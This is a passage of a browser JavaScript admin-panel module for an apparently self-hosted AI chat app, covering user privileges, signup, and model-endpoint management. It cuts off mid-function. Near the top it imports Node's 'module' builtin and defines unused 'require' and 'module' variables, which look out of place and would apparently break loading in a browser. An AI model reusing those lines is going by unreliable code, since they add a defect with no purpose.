// static/js/admin.js — Admin panel module (ES6)
// Admin-only: users, endpoints, MCP, RAG, embeddings, tokens, webhooks, features

import uiModule from './ui.js';
import settingsModule from './settings.js';
import { providerLogo } from './providers.js';
import { sortModelObjects } from './modelSort.js';
import { createRequire } from 'module';

var require = createRequire(import.meta.url);
var module = { exports: {} };

let initialized = false;
let modalEl = null;
// When the user adds an endpoint, store its id so the next render of
// the endpoints list can flash a glow on that row. Cleared once the
// animation fires.
let _recentlyAddedEpId = null;

function el(id) { return document.getElementById(id); }
function esc(s) { return uiModule.esc(s); }

/* ═══════════════════════════════════════════
   USERS TAB
   ═══════════════════════════════════════════ */
const PRIV_LABELS = {
  can_use_agent: 'Agent mode',
  can_use_browser: 'Browser automation',
  can_use_bash: 'Shell / Python / Files',
  can_use_documents: 'Document editor',
  can_use_research: 'Deep research',
  can_generate_images: 'Image generation',
  can_manage_memory: 'Memory & skills',
};

async function loadUsers() {
  const list = el('adm-userList');
  try {
    const res = await fetch('/api/auth/users', { credentials: 'same-origin' });
    if (res.status === 401 || res.status === 403) { list.innerHTML = '<div class="admin-empty">Access denied</div>'; return; }
    const data = await res.json();
    if (!data.users || data.users.length === 0) { list.innerHTML = '<div class="admin-empty">No users found</div>'; return; }
    list.innerHTML = '';
    data.users.forEach(u => {
      const row = document.createElement('div');
      row.className = 'admin-user-row';

      // Header: name + badges + delete
      const header = document.createElement('div');
      header.style.cssText = 'display:flex;align-items:center;justify-content:space-between;cursor:pointer;padding:4px 0;';
      const initial = u.username.charAt(0).toUpperCase();
      header.innerHTML = `
        <div class="admin-user-info">
          <div style="width:28px;height:28px;border-radius:50%;background:color-mix(in srgb, var(--accent) 20%, var(--panel));display:flex;align-items:center;justify-content:center;font-size:12px;font-weight:600;flex-shrink:0;color:var(--accent);">${esc(initial)}</div>
          <div>
            <span class="admin-user-name">${esc(u.username)}</span>
            ${u.is_admin ? '<span class="admin-badge" style="margin-left:6px;">ADMIN</span>' : '<span style="font-size:10px;opacity:0.4;display:block;">Click to manage privileges</span>'}
          </div>
        </div>
        <div style="display:flex;gap:8px;align-items:center;">
          <button class="admin-btn-sm" data-adm-rename-user="${esc(u.username)}" style="font-size:11px;">Rename</button>
          ${u.is_admin ? '' : `<button class="admin-btn-delete" data-adm-del-user="${esc(u.username)}" style="font-size:11px;">Remove</button>`}
          ${u.is_admin ? '' : '<svg class="admin-user-chevron" width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round" style="opacity:0.3;transition:transform 0.2s,opacity 0.2s;"><polyline points="6 9 12 15 18 9"/></svg>'}
        </div>
      `;
      row.appendChild(header);

      // Privileges panel (hidden by default, not for admins)
      if (!u.is_admin) {
        const privPanel = document.createElement('div');
        privPanel.className = 'admin-priv-panel hidden';
        privPanel.style.cssText = 'padding:8px 0 4px;border-top:1px solid var(--border);margin-top:8px;';

        // Boolean toggles
        let html = '<div style="font-size:10px;text-transform:uppercase;letter-spacing:0.5px;opacity:0.35;font-weight:600;margin-bottom:4px;">Features</div>';
        for (const [key, label] of Object.entries(PRIV_LABELS)) {
          const checked = u.privileges && u.privileges[key] ? 'checked' : '';
          html += `<div style="display:flex;align-items:center;justify-content:space-between;padding:4px 0;">
            <span style="font-size:12px;">${label}</span>
            <label class="admin-switch" style="transform:scale(0.85);"><input type="checkbox" data-priv="${key}" data-user="${esc(u.username)}" ${checked}><span class="admin-slider"></span></label>
          </div>`;
        }
        // Rate limit
        html += '<div style="font-size:10px;text-transform:uppercase;letter-spacing:0.5px;opacity:0.35;font-weight:600;margin:10px 0 4px;">Limits</div>';
        const maxMsg = (u.privileges && u.privileges.max_messages_per_day) || 0;
        html += `<div style="display:flex;align-items:center;justify-content:space-between;padding:4px 0;">
          <div>
            <span style="font-size:12px;">Daily message limit</span>
            <div style="font-size:10px;opacity:0.4;">0 = no limit</div>
          </div>
          <input type="number" min="0" value="${maxMsg}" data-priv="max_messages_per_day" data-user="${esc(u.username)}" style="width:70px;padding:4px 6px;background:var(--bg);border:1px solid var(--border);border-radius:4px;color:var(--fg);font-size:12px;text-align:center;">
        </div>`;
        // Allowed models — checkbox list
        const allowedSet = new Set((u.privileges && u.privileges.allowed_models) || []);
        const allEmpty = allowedSet.size === 0;
        html += `<div style="padding:4px 0;">
          <div style="display:flex;align-items:center;justify-content:space-between;">
            <span style="font-size:12px;">Allowed models</span>
            <div style="display:flex;gap:8px;">
              <a href="#" class="priv-models-all" data-user="${esc(u.username)}" style="font-size:10px;opacity:0.5;">All</a>
              <a href="#" class="priv-models-none" data-user="${esc(u.username)}" style="font-size:10px;opacity:0.5;">None</a>
            </div>
          </div>
          <div style="font-size:10px;opacity:0.4;margin-bottom:4px;">${allEmpty ? 'All models allowed (no restrictions)' : allowedSet.size + ' model(s) allowed'}</div>
          <div class="priv-models-list" data-user="${esc(u.username)}">
            <span style="opacity:0.4;font-size:11px;">Loading models...</span>
          </div>
        </div>`;
        privPanel.innerHTML = html;
        row.appendChild(privPanel);

        // Toggle panel visibility + rotate chevron + load models
        let _modelsLoaded = false;
        header.addEventListener('click', (e) => {
          if (e.target.closest('.admin-btn-delete, [data-adm-rename-user]')) return;
          privPanel.classList.toggle('hidden');
          const chevron = header.querySelector('.admin-user-chevron');
          if (chevron) {
            const isOpen = !privPanel.classList.contains('hidden');
            chevron.style.transform = isOpen ? 'rotate(180deg)' : '';
            chevron.style.opacity = isOpen ? '0.7' : '0.3';
          }
          // Load models list on first expand
          if (!_modelsLoaded && !privPanel.classList.contains('hidden')) {
            _modelsLoaded = true;
            _loadModelsForUser(u.username, allowedSet, privPanel);
          }
        });

        // Wire privilege changes (boolean + number inputs, not model checkboxes)
        privPanel.querySelectorAll('[data-priv]').forEach(input => {
          const handler = async () => {
            const username = input.dataset.user;
            const key = input.dataset.priv;
            let value;
            if (input.type === 'checkbox') value = input.checked;
            else if (input.type === 'number') value = parseInt(input.value) || 0;
            else value = input.value;
            try {
              await fetch(`/api/auth/users/${encodeURIComponent(username)}/privileges`, {
                method: 'PUT', credentials: 'same-origin',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ [key]: value }),
              });
            } catch (e) { uiModule.showError('Failed to update privilege'); }
          };
          if (input.type === 'checkbox') input.addEventListener('change', handler);
          else input.addEventListener('change', handler);
        });
      }

      // Rename button
      const renameBtn = row.querySelector('[data-adm-rename-user]');
      if (renameBtn) {
        renameBtn.addEventListener('click', async (e) => {
          e.stopPropagation();
          const oldUsername = renameBtn.dataset.admRenameUser;
          const next = await uiModule.styledPrompt(`Rename "${oldUsername}"`, {
            defaultValue: oldUsername,
            placeholder: 'New username',
            confirmText: 'Rename',
          });
          const username = (next || '').trim();
          if (!username || username === oldUsername) return;
          try {
            const res = await fetch(`/api/auth/users/${encodeURIComponent(oldUsername)}/rename`, {
              method: 'PUT',
              credentials: 'same-origin',
              headers: { 'Content-Type': 'application/json' },
              body: JSON.stringify({ username }),
            });
            const data = await res.json().catch(() => ({}));
            if (!res.ok) {
              uiModule.showError(data.detail || 'Failed to rename user');
              return;
            }
            if (data.renamed_self) {
              window.location.reload();
              return;
            }
            loadUsers();
          } catch (err) {
            uiModule.showError('Failed to rename user');
          }
        });
      }

      // Delete button
      const delBtn = row.querySelector('[data-adm-del-user]');
      if (delBtn) {
        delBtn.addEventListener('click', async (e) => {
          e.stopPropagation();
          const username = delBtn.dataset.admDelUser;
          if (!await uiModule.styledConfirm(`Remove user "${username}"?`, { confirmText: 'Remove', danger: true })) return;
          const res = await fetch('/api/auth/users', { method: 'DELETE', credentials: 'same-origin', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ username }) });
          if (res.ok) loadUsers();
          else uiModule.showError('Failed to delete user');
        });
      }

      list.appendChild(row);
    });
  } catch (e) { list.innerHTML = '<div class="admin-error">Failed to load users</div>'; }
}

async function _loadModelsForUser(username, allowedSet, privPanel) {
  const listEl = privPanel.querySelector(`.priv-models-list[data-user="${username}"]`);
  if (!listEl) return;
  try {
    const res = await fetch('/api/models', { credentials: 'same-origin' });
    const data = await res.json();
    const allModels = [];
    (data.items || []).forEach(item => {
      if (item.offline) return;
      (item.models || []).forEach(mid => {
        allModels.push({ mid, epName: item.endpoint_name || '', display: mid.split('/').pop() });
      });
    });
    if (!allModels.length) {
      listEl.innerHTML = '<span style="opacity:0.4;font-size:11px;">No models available</span>';
      return;
    }
    const allEmpty = allowedSet.size === 0;
    listEl.innerHTML = sortModelObjects(allModels).map(m => {
      const checked = allEmpty || allowedSet.has(m.mid) ? 'checked' : '';
      return `<label>
        <input type="checkbox" class="priv-model-cb" data-mid="${esc(m.mid)}" ${checked}>
        <span>${esc(m.display)}</span>
        <span style="opacity:0.3;font-size:10px;margin-left:auto;">${esc(m.epName)}</span>
      </label>`;
    }).join('');

    // Save on change
    function _saveModels() {
      const checked = [];
      listEl.querySelectorAll('.priv-model-cb').forEach(cb => {
        if (cb.checked) checked.push(cb.dataset.mid);
      });
      // If all are checked, send empty array (= no restrictions)
      const value = checked.length === allModels.length ? [] : checked;
      const hint = privPanel.querySelector('.priv-models-list[data-user]')?.previousElementSibling?.querySelector('div[style*="opacity"]');
      if (hint) hint.textContent = value.length === 0 ? 'All models allowed (no restrictions)' : value.length + ' model(s) allowed';
      fetch(`/api/auth/users/${encodeURIComponent(username)}/privileges`, {
        method: 'PUT', credentials: 'same-origin',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ allowed_models: value }),
      }).catch(() => {});
    }
    listEl.querySelectorAll('.priv-model-cb').forEach(cb => cb.addEventListener('change', _saveModels));

    // All / None buttons
    privPanel.querySelector(`.priv-models-all[data-user="${username}"]`)?.addEventListener('click', (e) => {
      e.preventDefault();
      listEl.querySelectorAll('.priv-model-cb').forEach(cb => cb.checked = true);
      _saveModels();
    });
    privPanel.querySelector(`.priv-models-none[data-user="${username}"]`)?.addEventListener('click', (e) => {
      e.preventDefault();
      listEl.querySelectorAll('.priv-model-cb').forEach(cb => cb.checked = false);
      _saveModels();
    });
  } catch (e) {
    listEl.innerHTML = '<span style="opacity:0.4;font-size:11px;">Failed to load models</span>';
  }
}

function initSignupToggle() {
  const toggle = el('adm-signupToggle');
  fetch('/api/auth/status', { credentials: 'same-origin' })
    .then(r => r.json())
    .then(d => { toggle.checked = !!d.signup_enabled; })
    .catch(e => console.warn('Auth status fetch failed:', e));
  toggle.addEventListener('change', async () => {
    try {
      const res = await fetch('/api/auth/signup-toggle', { method: 'POST', credentials: 'same-origin' });
      const data = await res.json();
      toggle.checked = data.signup_enabled;
    } catch (e) { toggle.checked = !toggle.checked; }
  });
}

function initAddUser() {
  el('adm-addBtn').addEventListener('click', async () => {
    const msg = el('adm-addMsg');
    msg.textContent = ''; msg.className = '';
    const username = el('adm-newUsername').value.trim();
    const password = el('adm-newPassword').value;
    const is_admin = el('adm-newIsAdmin').checked;
    if (!username) { msg.textContent = 'Username required'; msg.className = 'admin-error'; return; }
    if (password.length < 8) { msg.textContent = 'Password must be at least 8 characters'; msg.className = 'admin-error'; return; }
    el('adm-addBtn').disabled = true;
    try {
      const res = await fetch('/api/auth/users', { method: 'POST', credentials: 'same-origin', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ username, password, is_admin }) });
      const data = await res.json();
      if (res.ok) { msg.textContent = 'User created'; msg.className = 'admin-success'; el('adm-newUsername').value = ''; el('adm-newPassword').value = ''; el('adm-newIsAdmin').checked = false; loadUsers(); }
      else { msg.textContent = data.detail || 'Failed'; msg.className = 'admin-error'; }
    } catch (e) { msg.textContent = 'Request failed'; msg.className = 'admin-error'; }
    el('adm-addBtn').disabled = false;
  });
}

/* ═══════════════════════════════════════════
   SERVICES TAB — Endpoints
   ═══════════════════════════════════════════ */
function _isLocalEndpoint(url) {
  if (!url) return false;
  try {
    const u = new URL(url);
    const h = u.hostname.toLowerCase();
    if (h === 'localhost' || h === '127.0.0.1' || h === '0.0.0.0') return true;
    if (h.endsWith('.local')) return true;
    if (/^10\./.test(h)) return true;
    if (/^192\.168\./.test(h)) return true;
    if (/^172\.(1[6-9]|2[0-9]|3[01])\./.test(h)) return true;
    // Tailscale CGNAT range (100.64.0.0/10 → 100.64.x–100.127.x). Servers
    // found via "Scan for Servers" come back as tailnet IPs, which are still
    // your own machines, so group them under Local rather than API.
    if (/^100\.(6[4-9]|[7-9]\d|1[01]\d|12[0-7])\./.test(h)) return true;
    // Single-label hostnames are LAN by convention.
    if (!h.includes('.')) return true;
    return false;
  } catch { return false; }
}

async function _refreshAfterEndpointChange(deletedEndpointId) {
  try {
    const sm = window.sessionModule;
    const pending = sm && sm.getPendingChat ? sm.getPendingChat() : null;
    if (deletedEndpointId && pending && String(pending.endpointId || '') === String(deletedEndpointId)) {
      if (sm.setPendingChat) sm.setPendingChat(null);
    }
  } catch (_) {}
  try {
    if (window.modelsModule && window.modelsModule.refreshModels) {
      await window.modelsModule.refreshModels(true);
    }
  } catch (_) {}
  try {
    window.dispatchEvent(new CustomEvent('ge:model-endpoints-updated', {
      detail: { deletedEndpointId: deletedEndpointId || null }
    }));
  } catch (_) {}
  try {
    if (window.sessionModule && window.sessionModule.updateModelPicker) {
      window.sessionModule.updateModelPicker();
    }
  } catch (_) {}
}

async function _selectAddedModelInChat(endpoint) {
  const modelId = endpoint && Array.isArray(endpoint.models) ? endpoint.models[0] : '';
  if (!modelId) return;
  try {
    if (window.modelsModule && window.modelsModule.refreshModels) {
      await window.modelsModule.refreshModels(true);
    }
  } catch (_) {}
  try {
    document.dispatchEvent(new CustomEvent('odysseus:auto-select-model', {
      detail: {
        endpointId: endpoint.id || '',
        endpointName: endpoint.name || '',
        modelId,
        url: endpoint.base_url || '',
      }
    }));
  } catch (_) {}
}

async function loadEndpoints() {
  const listLocal = el('adm-epList-local');
  const listApi = el('adm-epList-api');
  // Fallback to the legacy single list if the split containers don't exist
  // (older HTML or third-party embedding).
  const listLegacy = el('adm-epList');
  // Refresh model picker so new endpoints show up in chat
  if (window.modelsModule && window.modelsModule.refreshModels) {
    window.modelsModule.refreshModels(true);
    setTimeout(() => {
      if (window.sessionModule && window.sessionModule.updateModelPicker) {
        window.sessionModule.updateModelPicker();
      }
    }, 1500);
  }
  if (settingsModule && typeof settingsModule.refreshAiModelEndpoints === 'function') {
    settingsModule.refreshAiModelEndpoints();
  }
  try {
    const res = await fetch('/api/model-endpoints', { credentials: 'same-origin' });
    // Treat a non-OK response (e.g. 401/403 for non-admins, or backend
    // returning an error envelope) the same as "no endpoints yet": show the
    // empty state, not "Failed to load". The user just installed the app —
    // there's literally nothing to load, so the error read as broken UI.
    let data = [];
    if (res.ok) {
      try { data = await res.json(); } catch { data = []; }
    }
    if (!Array.isArray(data) || data.length === 0) {
      const empty = '<div class="admin-empty">None</div>';
      if (listLocal) listLocal.innerHTML = empty;
      if (listApi) listApi.innerHTML = '<div class="admin-empty">None</div>';
      if (listLegacy) listLegacy.innerHTML = empty;
      return;
    }
    const rowHtml = data.map(ep => {
      const visibleCount = ep.models.length;
      const totalCount = visibleCount + (ep.hidden_count || 0);
      // `ep.models` is the *visible* set — when every model is hidden it's
      // empty, but we still need to render the expand panel so the user can
      // un-hide them. Gate on the total instead.
      const hasModels = ep.online && totalCount > 0;
      const statusBadge = ep.status === 'empty'
        ? '<span class="admin-badge">no models</span>'
        : ep.online
          ? `<span class="admin-badge">${visibleCount}/${totalCount} models enabled</span>`
          : '<span class="admin-badge admin-badge-off">offline</span>';
      const justAddedClass = (_recentlyAddedEpId && String(ep.id) === _recentlyAddedEpId) ? ' adm-ep-just-added' : '';
      return `
        <div class="admin-user-row${ep.is_enabled ? '' : ' admin-ep-disabled'}${justAddedClass}" data-adm-ep-id="${ep.id}">
          <div style="display:flex;align-items:center;justify-content:space-between;${hasModels ? 'cursor:pointer;' : ''}padding:4px 0;" data-adm-ep-header="${ep.id}">
            <div class="admin-user-info" style="flex:1;flex-wrap:wrap;gap:0.3rem;">
              <span class="admin-user-name">${esc(ep.name)}</span>
              ${ep.model_type === 'image' ? '<span class="admin-badge" style="background:color-mix(in srgb, var(--accent) 20%, transparent);color:var(--accent);">Image</span>' : ''}
              ${statusBadge}
              ${ep.is_enabled ? '' : '<span class="admin-badge admin-badge-off">disabled</span>'}
              ${hasModels ? '<span style="font-size:10px;opacity:0.4;">Click to manage models</span>' : ''}
            </div>
            <div style="display:flex;gap:4px;align-items:center;">
              <button class="admin-btn-sm" data-adm-toggle-ep="${ep.id}">${ep.is_enabled ? 'Disable' : 'Enable'}</button>
              <button class="admin-btn-delete" data-adm-del-ep="${ep.id}" data-adm-ep-online="${ep.online ? '1' : '0'}">Delete</button>
              ${hasModels ? '<svg class="admin-user-chevron" width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round" style="opacity:0.3;transition:transform 0.2s,opacity 0.2s;"><polyline points="6 9 12 15 18 9"/></svg>' : ''}
            </div>
          </div>
          <div class="admin-ep-detail">${esc(ep.base_url)}${_isLocalEndpoint(ep.base_url) ? `<button type="button" class="admin-ep-copy-btn" data-adm-copy-url="${esc(ep.base_url)}" title="Copy URL" aria-label="Copy URL" style="background:none;border:none;padding:0 2px;margin-left:6px;cursor:pointer;color:inherit;opacity:0.45;vertical-align:-2px;line-height:1;"><svg width="11" height="11" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><rect x="9" y="9" width="13" height="13" rx="2"/><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/></svg></button>` : ''}${ep.has_key ? ' (key set)' : ''}</div>
          ${hasModels ? `<div class="mcp-tools-panel hidden" data-adm-ep-models-panel="${ep.id}"></div>` : ''}
        </div>`;
    });
    // Partition rows into Local vs API for the split sections.
    // Subsections without any rows are hidden entirely (heading + all)
    // so empty groups don't take up vertical real estate.
    const _renderInto = (container, indices) => {
      if (!container) return;
      const section = container.closest('.adm-ep-section');
      if (!indices.length) {
        if (section) section.style.display = 'none';
        container.innerHTML = '';
        return;
      }
      if (section) section.style.display = '';
      container.innerHTML = indices.map(i => rowHtml[i]).join('');
    };
    const localIdx = [], apiIdx = [];
    data.forEach((ep, i) => (_isLocalEndpoint(ep.base_url) ? localIdx : apiIdx).push(i));
    // Sort each section: enabled endpoints first, disabled at the bottom.
    // Preserve original order within each group via stable sort.
    const _sortByEnabled = (a, b) => Number(!!data[b].is_enabled) - Number(!!data[a].is_enabled);
    localIdx.sort(_sortByEnabled);
    apiIdx.sort(_sortByEnabled);
    _renderInto(listLocal, localIdx);
    _renderInto(listApi, apiIdx);
    if (listLegacy) listLegacy.innerHTML = rowHtml.join('');
    // Iterate matching nodes across both containers.
    const queryAll = (sel) => {
      const out = [];
      [listLocal, listApi, listLegacy].forEach(c => {
        if (c) c.querySelectorAll(sel).forEach(n => out.push(n));
      });
      return out;
    };
    queryAll('[data-adm-toggle-ep]').forEach(btn => {
      btn.addEventListener('click', async (e) => { e.stopPropagation(); await fetch(`/api/model-endpoints/${btn.dataset.admToggleEp}`, { method: 'PATCH' }); loadEndpoints(); });
    });
    queryAll('[data-adm-copy-url]').forEach(btn => {
      btn.addEventListener('click', (e) => {
        e.stopPropagation();
        const url = btn.dataset.admCopyUrl || '';
        if (!url) return;
        uiModule.copyToClipboard(url).then(() => {
          // Brief icon swap to a checkmark so the user gets feedback that
          // the copy actually happened. Reverts after ~1.4s.
          const prev = btn.innerHTML;
          btn.innerHTML = '<svg width="11" height="11" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><polyline points="20 6 9 17 4 12"/></svg>';
          btn.style.opacity = '1';
          setTimeout(() => { btn.innerHTML = prev; btn.style.opacity = ''; }, 1400);
        }).catch(() => {});
      });
    });
    queryAll('[data-adm-del-ep]').forEach(btn => {
      btn.addEventListener('click', async (e) => {
        e.stopPropagation();
        var epId = btn.dataset.admDelEp;
        var isOffline = btn.dataset.admEpOnline === '0';
        // Offline endpoints are already broken — skip the confirm dialog
        // entirely and delete immediately. The optimistic UI removal makes
        // the action feel instant.
        if (!isOffline) {
          var deps = [];
          try {
            var depRes = await fetch('/api/model-endpoints/' + epId + '/dependents', { credentials: 'same-origin' });
            var depData = await depRes.json();
            deps = depData.dependents || [];
          } catch (e) { /* proceed without warning */ }
          var msg = 'Delete this endpoint?';
          if (deps.length) {
            msg += '\n\nThe following settings use this endpoint and will be reset:\n— ' + deps.join('\n— ');
          }
          if (!await uiModule.styledConfirm(msg, { confirmText: 'Delete', danger: true })) return;
        }
        // Optimistic: remove from UI immediately
        const row = btn.closest('[data-adm-ep-id]');
        if (row) row.remove();
        fetch('/api/model-endpoints/' + epId, { method: 'DELETE' })
          .then(() => _refreshAfterEndpointChange(epId))
          .then(() => loadEndpoints())
          .catch(() => loadEndpoints());
      });
    });
    // Clear the just-added marker now that the row has been rendered
    // with the animation class — keeps the glow from re-firing on every
    // subsequent loadEndpoints() call (e.g. when toggling a model).
    if (_recentlyAddedEpId) _recentlyAddedEpId = null;
    // Models expand/collapse (click anywhere on card)
    queryAll('[data-adm-ep-id]').forEach(row => {
      const header = row.querySelector('[data-adm-ep-header]');
      if (!header) return;
      let _modelsLoaded = false;
      row.style.cursor = 'pointer';
      row.addEventListener('click', async (e) => {
        // Don't let interactions inside the expanded panel re-fire the
        // expand/collapse handler — the search box was getting closed
        // because clicking it bubbled up to here.
        if (e.target.closest('.admin-btn-sm, .admin-btn-delete, .mcp-tools-list, .mcp-tools-header, .mcp-tools-search, input, label')) return;
        const epId = header.dataset.admEpHeader;
        const panel = row.querySelector(`[data-adm-ep-models-panel="${epId}"]`);
        if (!panel) return;
        panel.classList.toggle('hidden');
        const chevron = row.querySelector('.admin-user-chevron');
        const isOpen = !panel.classList.contains('hidden');
        if (chevron) {
          chevron.style.transform = isOpen ? 'rotate(180deg)' : '';
          chevron.style.opacity = isOpen ? '0.7' : '0.3';
        }
        if (!_modelsLoaded && isOpen) {
          _modelsLoaded = true;
          // Our shared whirlpool spinner (consistent with the rest of the app).
          panel.innerHTML = '';
          let _modelsSpin = null;
          const _ld = document.createElement('span');
          _ld.style.cssText = 'opacity:0.55;font-size:11px;display:inline-flex;align-items:center;gap:8px;';
          _ld.appendChild(document.createTextNode('Loading models…'));
          try {
            const _sp = (await import('./spinner.js')).default;
            _modelsSpin = _sp.createWhirlpool(14);
            _modelsSpin.element.style.cssText = 'width:14px;height:14px;margin:0;display:inline-block;';
            _ld.appendChild(_modelsSpin.element);
          } catch (_) {}
          panel.appendChild(_ld);
          const _stopSpin = () => { try { _modelsSpin && _modelsSpin.stop(); } catch (_) {} };
          try {
            const res = await fetch(`/api/model-endpoints/${epId}/models`, { credentials: 'same-origin' });
            const models = await res.json();
            _stopSpin();
            const sortedModels = sortModelObjects(models);
            if (!sortedModels.length) { panel.innerHTML = '<span style="opacity:0.5;font-size:11px;">No models</span>'; return; }
            const hiddenSet = new Set(sortedModels.filter(m => m.is_hidden).map(m => m.id));
            const showSearch = sortedModels.length >= 8;
            panel.innerHTML = `<div class="mcp-tools-header">
              <span>Models</span>
              <span style="display:flex;gap:8px;align-items:center;">
                <span class="mcp-tools-count">${sortedModels.length - hiddenSet.size}/${sortedModels.length} enabled</span>
                <a href="#" data-ep-select-all="${epId}">All</a>
                <a href="#" data-ep-select-none="${epId}">None</a>
              </span>
            </div>${showSearch ? `<input type="search" class="mcp-tools-search" placeholder="Search ${sortedModels.length} models..." data-ep-search="${epId}">` : ''}<div class="mcp-tools-list">` + sortedModels.map(m =>
              `<label title="${esc(m.id)}" data-ep-model-row data-search="${esc((m.display + ' ' + m.id).toLowerCase())}" class="adm-model-row">
                <input type="checkbox" class="adm-cb-hidden" data-ep-model-id="${esc(m.id)}" ${!m.is_hidden ? 'checked' : ''}>
                <span class="adm-check-dot" aria-hidden="true"></span>
                <span>${esc(m.display)}</span>
              </label>`
            ).join('') + '</div>';
            const filterRows = (q) => {
              const needle = q.trim().toLowerCase();
              panel.querySelectorAll('[data-ep-model-row]').forEach(row => {
                row.style.display = (!needle || row.dataset.search.includes(needle)) ? '' : 'none';
              });
            };
            panel.querySelector(`[data-ep-search="${epId}"]`)?.addEventListener('input', (e) => filterRows(e.target.value));
            panel.querySelector(`[data-ep-select-all="${epId}"]`)?.addEventListener('click', (e) => {
              e.preventDefault();
              panel.querySelectorAll('[data-ep-model-row]').forEach(row => {
                if (row.style.display !== 'none') row.querySelector('input[type=checkbox]').checked = true;
              });
              _saveEpModelState(epId, panel);
            });
            panel.querySelector(`[data-ep-select-none="${epId}"]`)?.addEventListener('click', (e) => {
              e.preventDefault();
              panel.querySelectorAll('[data-ep-model-row]').forEach(row => {
                if (row.style.display !== 'none') row.querySelector('input[type=checkbox]').checked = false;
              });
              _saveEpModelState(epId, panel);
            });
            panel.querySelectorAll('input[type=checkbox]').forEach(cb => {
              cb.addEventListener('change', () => _saveEpModelState(epId, panel));
            });
          } catch (e) { _stopSpin(); panel.innerHTML = '<span class="admin-error" style="font-size:11px;">Failed to load models</span>'; }
        }
      });
    });
  } catch (e) {
    const err = '<div class="admin-error">Failed to load</div>';
    [listLocal, listApi, listLegacy].forEach(c => { if (c) c.innerHTML = err; });
  }
}

async function _saveEpModelState(epId, panel) {
  const hidden = [];
  panel.querySelectorAll('input[type=checkbox]').forEach(cb => {
    if (!cb.checked) hidden.push(cb.dataset.epModelId);
  });
  const total = panel.querySelectorAll('input[type=checkbox]').length;
  try {
    await fetch(`/api/model-endpoints/${epId}/models`, {
      method: 'PATCH',
      headers: { 'Content-Type': 'application/json' },
      credentials: 'same-origin',
      body: JSON.stringify({ hidden }),
    });
    const countLabel = panel.querySelector('.mcp-tools-count');
    if (countLabel) countLabel.textContent = `${total - hidden.length}/${total} enabled`;
    const row = panel.closest('[data-adm-ep-id]');
    if (row) {
      const badge = row.querySelector('.admin-badge');
      if (badge && !badge.classList.contains('admin-badge-off')) badge.textContent = `${total - hidden.length}/${total} models enabled`;
    }
    if (settingsModule && typeof settingsModule.refreshAiModelEndpoints === 'function') {
      settingsModule.refreshAiModelEndpoints();
    }
  } catch (e) { /* silent */ }
}

function initEndpointForm() {
  const provider = el('adm-epProvider');
  const urlInput = el('adm-epUrl');

  // Custom provider picker — mirrors the (now hidden) <select id="adm-epProvider">
  // so the rest of this function (which reads provider.value and dispatches
  // change events) keeps working unchanged.
  const picker = el('adm-provider-picker');
  const pickerBtn = el('adm-provider-btn');
  const pickerMenu = el('adm-provider-menu');
  const pickerCurrent = picker ? picker.querySelector('.adm-provider-current') : null;
  function _renderPickerMenu() {
    if (!pickerMenu) return;
    pickerMenu.innerHTML = Array.from(provider.options).map(o => {
      const logo = o.dataset.logo ? (providerLogo(o.dataset.logo) || '') : '';
      const active = o.value === provider.value ? ' active' : '';
      return `<div class="adm-provider-item${active}" role="option" data-value="${o.value.replace(/"/g, '&quot;')}">
        <span class="adm-provider-logo">${logo}</span>
        <span>${o.textContent}</span>
      </div>`;
    }).join('');
  }
  function _syncPickerCurrent() {
    if (!pickerCurrent) return;
    const opt = provider.selectedOptions[0] || provider.options[0];
    const logo = opt.dataset.logo ? (providerLogo(opt.dataset.logo) || '') : '';
    pickerCurrent.querySelector('.adm-provider-logo').innerHTML = logo;
    pickerCurrent.querySelector('.adm-provider-name').textContent = opt.textContent;
  }
  if (picker && pickerBtn && pickerMenu && pickerCurrent) {
    _renderPickerMenu();
    _syncPickerCurrent();
    if (provider.value && !urlInput.value) urlInput.value = provider.value;
    pickerBtn.addEventListener('click', (e) => {
      e.stopPropagation();
      pickerMenu.classList.toggle('hidden');
    });
    pickerMenu.addEventListener('click', (e) => {
      const item = e.target.closest('.adm-provider-item');
      if (!item) return;
      provider.value = item.dataset.value;
      provider.dispatchEvent(new Event('change', { bubbles: true }));
      pickerMenu.classList.add('hidden');
      _renderPickerMenu();
      _syncPickerCurrent();
    });
    document.addEventListener('click', (e) => {
      if (!picker.contains(e.target)) pickerMenu.classList.add('hidden');
    });
  }

  provider.addEventListener('change', () => {
    if (provider.value) urlInput.value = provider.value;
    else urlInput.value = '';
  });
  urlInput.addEventListener('input', () => {
    if (provider.value && urlInput.value.trim() !== provider.value) {
      provider.value = '';
      _renderPickerMenu();
      _syncPickerCurrent();
    }
  });
  function _normalizeBaseUrl(raw) {
    let u = raw.trim();
    // Fix common protocol typos
    u = u.replace(/^https?:\/(?!\/)/, m => m + '/');  // https:/ → https://
    u = u.replace(/^htp:/, 'http:').replace(/^htps:/, 'https:');
    u = u.replace(/^http:\/\/\//, 'http://');  // http:/// → http://
    u = u.replace(/^https:\/\/\//, 'https://');
    // Add http:// if no protocol
    if (!/^https?:\/\//.test(u)) u = 'http://' + u;
    // Strip trailing slashes
    u = u.replace(/\/+$/, '');
    // Strip trailing paths that shouldn't be in a base URL
    u = u.replace(/\/v1\/(models|chat\/completions|completions|messages)\/?$/i, '/v1');
    u = u.replace(/\/(models|chat\/completions|completions|v1\/messages)\/?$/i, '');
    u = u.replace(/\/api\/(chat|tags|generate)\/?$/i, '/api');
    // Fix double /v1/v1
    u = u.replace(/\/v1\/v1$/, '/v1');
    // Strip query params and fragments
    u = u.split('?')[0].split('#')[0];
    try {
      const parsed = new URL(u);
      if (parsed.hostname.endsWith('ollama.com')) {
        u = 'https://ollama.com/api';
      }
    } catch(e) {}
    // Ensure /v1 suffix for bare host:port URLs (not cloud providers)
    if (!u.includes('api.') && !u.includes('openrouter') && !u.includes('ollama.com') && !u.endsWith('/v1')) {
      try {
        const parsed = new URL(u);
        if (!parsed.pathname || parsed.pathname === '/') {
          u += '/v1';
